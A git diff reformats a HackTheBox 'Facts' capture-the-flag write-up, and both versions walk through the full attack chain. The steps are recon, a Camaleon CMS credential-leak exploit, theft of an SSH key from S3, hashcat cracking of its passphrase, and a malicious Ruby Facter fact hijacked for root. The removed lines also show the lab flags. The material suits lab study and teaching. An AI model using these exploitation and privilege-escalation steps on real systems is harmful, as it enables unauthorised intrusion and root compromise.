@@ -1,101 +1,154 @@
-HackTheBox: Facts Writeup
-Target IP: 10.10.11.x (Replace with actual IP)
-OS: Linux/Windows (Hybrid/Lab Environment)
+<img width="446" height="259" alt="image" src="https://github.com/user-attachments/assets/e1d279e0-784b-4b7c-9699-32345c182a4e" />
 
-1. Reconnaissance & Scanning
-We start by mapping the target's attack surface. First, ensure the hostname resolves correctly by adding it to your /etc/hosts file:
-echo "10.10.11.x facts.htb" | sudo tee -a /etc/hosts
 
-Network Scanning
-An initial Nmap scan identifies the services running on the host:
+# HackTheBox: Facts Writeup
 
-Bash
-nmap -sC -sV -oA nmap/facts 10.10.11.x
-Results:
+**Target IP:** `10.10.11.x` (replace with actual IP)  
+**OS:** Linux/Windows (Hybrid/Lab Environment)
 
-Port 80 (HTTP): Web server hosting the trivia site.
+---
 
-Port 1433 (MSSQL): Microsoft SQL Server.
+## 1. Reconnaissance & Scanning
 
-Port 5985 (WinRM): Suggests a Windows environment or a cross-platform interaction.
+Map the target's attack surface.
 
-2. Enumeration
-Web & Subdomain Discovery
-Navigating to [http://facts.htb](http://facts.htb) shows a standard trivia site. To find administrative entry points, we use Gobuster:
+- Ensure hostname resolves correctly by adding to `/etc/hosts`:
+  ```bash
+  echo "10.10.11.x facts.htb" | sudo tee -a /etc/hosts
+  ```
 
-Bash
-gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt
-This reveals the /admin directory. Upon visiting the login page, we find a registration link and create a dummy account:
+- Network Scanning: Identify running services with Nmap:
+  ```bash
+  nmap -sC -sV -oA nmap/facts 10.10.11.x
+  ```
 
-Username: johnr
+  **Results:**
+  - Port 80 (HTTP): Web server hosting the trivia site.
+  - Port 1433 (MSSQL): Microsoft SQL Server.
+  - Port 5985 (WinRM): Suggests a Windows environment or cross-platform interaction.
 
-Password: johnr123
+---
 
-CMS Identification
-Once logged into the dashboard, the footer/meta tags identify the site as Camaleon CMS v2.9.0. This version is known for several vulnerabilities.
+## 2. Enumeration
 
-3. Exploitation
-CVE-2025–2304 (Privilege Escalation & Leak)
-Camaleon CMS v2.9.0 is vulnerable to a Post-Auth credential leak. Since we have a low-privileged account (johnr), we can exploit this to access AWS S3 configuration details.
+### Web & Subdomain Discovery
 
-Exploit Execution:
-Using a Python script to target the vulnerable endpoint:
+- Visit: [http://facts.htb](http://facts.htb)
+- Discover administrative entry points using Gobuster:
+  ```bash
+  gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt
+  ```
+- The `/admin` directory is found. Accessing its login page allows registration of a dummy account:
 
-Bash
+  - **Username:** `johnr`
+  - **Password:** `johnr123`
+
+### CMS Identification
+
+- Logged into dashboard, meta tags identify:  
+  **Camaleon CMS v2.9.0** (known vulnerabilities)
+
+---
+
+## 3. Exploitation
+
+### CVE-2025–2304 (Privilege Escalation & Leak)
+
+- Camaleon CMS v2.9.0 is vulnerable to a post-auth credential leak.
+- With user `johnr`, exploit to leak AWS S3 config.
+
+**Exploit Example:**
+```bash
 python3 exploit_camaleon.py http://facts.htb -u johnr -p johnr123
-The exploit leaks internal S3 bucket credentials. We then use the AWS CLI to list the contents:
+```
 
-Bash
-export AWS_ACCESS_KEY_ID=AKIA...
-export AWS_SECRET_ACCESS_KEY=...
-aws s3 ls s3://facts-storage-bucket --endpoint-url http://facts.htb:4566
-We find a file named id_rsa. We download it:
+**Exposure:**
+- AWS S3 bucket credentials are leaked. Use AWS CLI:
+  ```bash
+  export AWS_ACCESS_KEY_ID=AKIA...
+  export AWS_SECRET_ACCESS_KEY=...
+  aws s3 ls s3://facts-storage-bucket --endpoint-url http://facts.htb:4566
+  ```
 
-Bash
-aws s3 cp s3://facts-storage-bucket/id_rsa . --endpoint-url http://facts.htb:4566
-4. Privilege Escalation (User)
-The SSH key is passphrase-protected. We use John the Ripper and Hashcat to crack it.
+- Find and download `id_rsa` file:
+  ```bash
+  aws s3 cp s3://facts-storage-bucket/id_rsa . --endpoint-url http://facts.htb:4566
+  ```
 
-Extract the hash:
-ssh2john id_rsa > id_rsa.hash
+---
 
-Crack with Hashcat:
-hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt
+## 4. Privilege Escalation (User)
 
-The password is recovered: dragonballz.
+### SSH Key Cracking
 
-SSH Access:
+- The SSH key (`id_rsa`) is passphrase-protected.
+- Use `John the Ripper` or `Hashcat`:
 
-Bash
+  **Extract the hash:**
+  ```bash
+  ssh2john id_rsa > id_rsa.hash
+  ```
+
+  **Crack with Hashcat:**
+  ```bash
+  hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt
+  ```
+
+  - Password is recovered: `dragonballz`
+
+**SSH Access:**
+```bash
 chmod 600 id_rsa
 ssh -i id_rsa william@facts.htb
-User Flag: 17279e4c5b001d5072fbf5c0d5cee4f7
+```
+**User Flag:**  
+```
+[REDACTED_USER_FLAG]
+```
 
-5. Privilege Escalation (Root)
-Facter Library Hijacking
-Checking for SUID binaries or interesting permissions, we find /usr/bin/facter. Facter is a Ruby-based tool used to gather system information.
+---
 
-Facter searches for "custom facts" in specific directories. We can hijack this by creating a malicious Ruby file in a directory Facter checks (like /tmp or a local library path).
+## 5. Privilege Escalation (Root)
 
-The Payload (/tmp/exploit.rb):
+### Facter Library Hijacking
 
-Ruby
-Facter.add(:evil_fact) do
-  setcode do
-    File.read("/root/root.txt") # Or execute a shell: /bin/bash -p
+- Find `/usr/bin/facter` (Ruby-based system info tool)
+
+- Facter searches for custom facts in certain directories. Create a malicious Ruby fact:
+
+  **/tmp/exploit.rb**
+  ```ruby
+  Facter.add(:evil_fact) do
+    setcode do
+      File.read("/root/root.txt") # Or execute a shell: /bin/bash -p
+    end
   end
-end
-Execution:
-We run Facter and point the search path to our malicious script:
+  ```
 
-Bash
+**Execute:**
+```bash
 facter --custom-dir /tmp evil_fact
-Alternatively, if Facter is running with elevated privileges or via a cronjob/sudo, we can spawn a root shell:
-
-Bash
-# Example if sudo -u root /usr/bin/facter is allowed
+```
+_If Facter is run with elevated privileges (e.g., via sudo or a cronjob):_
+```bash
 export FACTERLIB=/tmp
 sudo /usr/bin/facter
-This executes our Ruby code in the context of the root user, allowing us to read the final flag.
+```
 
-Root Flag: 0201aac03c786e1a6740458ee8819116
+**Root Flag:**  
+```
+[REDACTED_ROOT_FLAG]
+```
+
+---
+
+## Summary
+
+- Initial access gained through web enumeration, exploiting a vulnerable CMS.
+- Credentials allowed S3 access and retrieval of an SSH key.
+- SSH key cracking yielded a user shell.
+- SUID binary (`facter`) abuse results in root privilege escalation.
+
+---
+
+**Note:** All flags in this writeup have been redacted for privacy and integrity.
